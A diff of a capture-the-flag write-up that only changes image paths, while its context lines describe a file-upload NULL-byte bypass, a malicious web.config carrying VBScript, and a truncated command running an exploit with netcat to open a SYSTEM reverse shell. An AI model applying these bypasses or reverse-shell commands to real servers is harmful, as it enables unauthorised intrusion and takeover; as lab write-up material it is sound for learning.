@@ -51,11 +51,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 The ASPX page was a simple file upload.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (5).png" alt=""><figcaption></figcaption></figure>
 
 I tried to upload an ASPX reverse shell, but it gives me an Invalid File error.
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (6).png" alt=""><figcaption></figcaption></figure>
 
 This can be bypassed via NULL byte by appending `%00.jpg` to the end of the filename in Burp.
 
@@ -63,7 +63,7 @@ This can be bypassed via NULL byte by appending `%00.jpg` to the end of the file
 
 However, when trying to view the file at `/UploadedFiles/rev.aspx`, it returns an error instead of a shell.
 
-<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (30) (8).png" alt=""><figcaption></figcaption></figure>
 
 So uploading ASPX files doesn't work. But how about `web.config` files? It is possible to upload one that has VBScript embedded within it to execute commands. This is because we can potentially overwrite the existing `web.config` file and replace it with ours that executes commands.
 
@@ -166,6 +166,6 @@ C:\users\merlin\desktop\exploit.exe "C:\users\merlin\desktop\nc.exe -e cmd.exe 1
 
 This would give us a reverse shell as SYSTEM.
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (3).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
